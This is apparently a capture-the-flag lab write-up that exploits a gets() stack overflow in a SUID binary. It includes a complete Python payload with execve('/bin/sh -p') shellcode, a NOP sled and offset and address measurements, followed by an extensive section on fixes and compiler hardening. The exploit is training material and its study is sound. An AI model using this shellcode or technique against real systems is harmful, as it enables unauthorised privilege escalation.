# Rainfall — Level 0: Stack Buffer Overflow (`case`)

**Target:** `case` — SUID `flag00` binary, x86-64 Linux
**Goal:** Read `/home/flag00/.pass`
**Technique:** Stack buffer overflow → shellcode injection → SUID shell

---

## 1. Reconnaissance

```bash
ls -la                     # -rwsr-x--- 1 flag00 level00 case  ← SUID bit!
checksec --file=./case
```

```
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX disabled   No PIE
```

These results define the attack surface:

| Finding | Meaning |
|---|---|
| **NX disabled** | The stack is executable (`GNU_STACK RWE`) → shellcode on the stack runs |
| **No canary** | Nothing detects an overwrite of the saved return address |
| **No PIE** | Binary loads at fixed `0x400000` (not needed here, but useful later) |
| **SUID flag00** | Any code we execute inherits `euid=flag00` — this is the win condition |

Reading the source (`case.c`) confirms the bug immediately:

```c
char credentials[64];   // 64-byte buffer
...
gets(credentials);      // reads UNLIMITED input — classic
```

`gets()` has no bounds check. Everything past the buffer walks straight up the
stack, over the saved frame pointer and the saved return address.

> Note: the hardcoded password `zion_access_2077` is a red herring — logging in
> only prints a random token. The flag lives in the SUID privileges.

## 2. Computing the offset from the disassembly

```bash
objdump -d -M intel ./case | awk '/<auth_loop>:/,/ret/'
```

```asm
sub    rsp,0x50           ; 80 bytes of locals
lea    rax,[rbp-0x50]     ; credentials starts here
call   401160 <gets@plt>  ; unbounded read
...
leave                     ; mov rsp,rbp ; pop rbp
ret                       ; ← pops OUR 8 bytes into RIP
```

Stack layout of `auth_loop`:

```
rbp-0x50   credentials[80]      ← offset  0 from buffer
rbp-0x04   sid
rbp+0x00   saved RBP            ← offset 80
rbp+0x08   return address       ← offset 88  ★ our target
```

**Offset = 0x50 (buffer) + 8 (saved RBP) = 88 bytes.**

## 3. Measuring the buffer address at runtime

Static analysis tells us the offset; only a live process tells us the address.

```bash
cat /proc/sys/kernel/randomize_va_space   # must be 0 (ASLR off)
echo "AAAA" > /tmp/dummy
gdb -q ./case
```

If GDB reports `Permission denied: '/opt/pwndbg/.venv/uv.lock.hash'` during startup, retry with:

```bash
gdb -nx -q ./case
```

`-nx` skips GDB initialization files, so pwndbg does not start and trigger the permission error. **Level 02 example:** `gdb -nx -q ./dixie`.

```
(gdb) set exec-wrapper env -i     # make gdb's environment match `env -i ./case`
(gdb) break *0x40159b             # first instruction AFTER gets returns
(gdb) run < /tmp/dummy
(gdb) p/x $rbp-0x50               # → 0x7fffffffeca0  = BUF
(gdb) x/gx $rbp+8                 # return slot — this is what we overwrite
```

**BUF = `0x7fffffffeca0`** (re-measure on every machine — addresses from
another box or another gdb setup are worthless).

## 4. The payload

```python
import struct

BUF      = 0x7fffffffeca0          # measured in gdb
OFFSET   = 88
RET      = BUF + 0x50 + 8 + 8 + 128   # land mid-sled (±128 B of tolerance)

sc = bytes.fromhex(
    "4831d2"                # xor  rdx, rdx              ; envp = NULL
    "52"                    # push rdx                   ; NULL
    "48b82f62696e2f736800"  # movabs rax, "/bin/sh"
    "50"                    # push rax
    "4889e7"                # mov  rdi, rsp              ; rdi = "/bin/sh"
    "b82d700000"            # mov  eax, "-p"
    "50"                    # push rax
    "52"                    # push rdx
    "488d442408"            # lea  rax, [rsp+8]          ; &"-p"
    "50"                    # push rax                   ; argv[1]
    "57"                    # push rdi                   ; argv[0]
    "4889e6"                # mov  rsi, rsp              ; argv
    "b83b000000"            # mov  eax, 59               ; execve
    "0f05"                  # syscall
)

payload  = b"A" * OFFSET               # filler up to saved RIP
payload += struct.pack("<Q", RET)      # new return address → NOP sled
payload += b"\x90" * 256               # NOP sled
payload += sc                          # execve("/bin/sh", ["/bin/sh","-p"], NULL)
payload += b"\n"                       # terminate the gets() read
open("/tmp/pwn", "wb").write(payload)
```

## 5. Firing

```bash
(cat /tmp/pwn; cat) | env -i ./case
```

- `env -i` matches gdb's `exec-wrapper env -i` → identical stack in both.
- The trailing `cat` keeps stdin open so the spawned shell doesn't die on EOF.
- Then, in the spawned shell (no prompt appears — just type):

```
id                        # uid=1001(level00) euid=1017(flag00)  ← privilege stolen
cat /home/flag00/.pass    # FLAG
```

## 6. The SUID twist: why `sh -p`?

The first exploit attempt spawned a shell that ran as plain `level00`.
Reason: `/bin/sh` is **dash**, and modern shells **drop the effective UID**
back to the real UID on startup unless run with `-p` (privileged mode).
The final shellcode therefore calls
`execve("/bin/sh", ["/bin/sh", "-p"], NULL)` to *keep* the stolen `euid`.

**Lesson: getting code execution ≠ winning. The flag lives in *whose
privileges* the process carries.**

## 7. Attack chain summary

```
1. checksec        → NX off, no canary → stack shellcode is viable
2. disassembly     → offset 88 to saved RIP
3. gdb measurement → BUF = 0x7fffffffeca0
4. payload         → 88×'A' + &sled + NOP sled + sh-p shellcode
5. env -i          → gdb and real execution agree on the stack
6. sh -p           → keep the SUID euid flag00
7. cat .pass       → flag
```

---

## 8. How to protect against this

### 8.1 Fix the code (the only *real* fix)

Replace the unbounded read with a bounded one:

```c
char credentials[64];

if (!fgets(credentials, sizeof(credentials), stdin)) {
    fprintf(stderr, "[-] read error\n");
    exit(1);
}
credentials[strcspn(credentials, "\n")] = '\0';   // strip trailing newline
```

`fgets` stops at `sizeof(credentials)-1` bytes — an overflow becomes
*impossible by construction*, regardless of compiler or OS protections.

`gets()` is so dangerous it was **removed from the C11 standard**; modern
glibc refuses to link programs that use it. GCC even warns at compile time:

```
warning: the `gets' function is dangerous and should never be used.
```

Listen to your compiler.

### 8.2 Compiler hardening

```bash
gcc -O2 \
    -D_FORTIFY_SOURCE=3 \
    -fstack-protector-all \
    -fPIE -pie \
    -Wl,-z,relro,-z,now \
    -Wl,-z,noexecstack \
    case.c -o case
```

| Flag | Protection | What it would have done to this attack |
|---|---|---|
| `-fstack-protector-all` | **Stack canary** | A random value sits between buffer and saved RIP; overwriting it trips `__stack_chk_fail` → *"stack smashing detected"* → abort. The `ret` never happens. |
| `-z noexecstack` (default) | **NX** | Stack pages are R–W, not R–W–X. Our sled+shellcode is inert *data*; executing it raises SIGSEGV. |
| `-fPIE -pie` | **PIE** | Binary (and its gadgets) load at a random base — no fixed addresses. |
| `-D_FORTIFY_SOURCE=3` | **FORTIFY** | Bounded variants of dangerous functions; catches some overflows at runtime. |
| `-z relro -z now` | **Full RELRO** | GOT becomes read-only — blocks GOT-overwrite follow-ups. |

Two system-level pieces complete the picture:

- **ASLR** (`/proc/sys/kernel/randomize_va_space = 2`): stack, heap and
  libraries move every run. Our hardcoded `RET = 0x7fff...` would hit NOP
  sled on one run and unmapped memory on the next.
- **File permissions**: `.pass` is `-r-------- flag00` — correct default-deny.
  The file was never the weak point; the SUID binary that could *reach* it was.

### 8.3 Mapping defenses to attack steps

Defense-in-depth means every layer kills the attack at a *different* stage:

```
Attack step                        Defense that stops it
─────────────────────────────────  ─────────────────────────────────
unbounded gets() read              fgets / bounds check      → no overflow at all
overwrite 88 bytes up the stack    stack canary              → detected, abort
execute shellcode on stack         NX                        → data can't run
hardcoded stack address            ASLR                      → address is garbage
ret2libc fallback (next levels)    PIE + Full RELRO          → gadgets & GOT move
spawn privileged shell             drop euid early / no SUID → nothing to escalate
read the flag                      file permissions          → last line of defense
```

The `sh -p` trick also deserves a defense note: SUID programs that hand the
user an interactive shell are almost always a design flaw. The safe patterns
are **privilege separation** (a tiny SUID helper that performs one audited
operation and immediately drops euid back) or dropping privileges before any
user-controlled input is processed:

```c
seteuid(getuid());   /* do this BEFORE reading user input */
```

### 8.4 The takeaway

No single measure above is "the" defense. Each one, alone, would have broken
*this* exploit at a specific link of the chain. Stacked together they don't
make exploitation impossible — they make it **expensive**, forcing the
attacker from a one-shot overflow to multi-stage techniques: leaking the
canary, leaking libc addresses, building ROP chains.
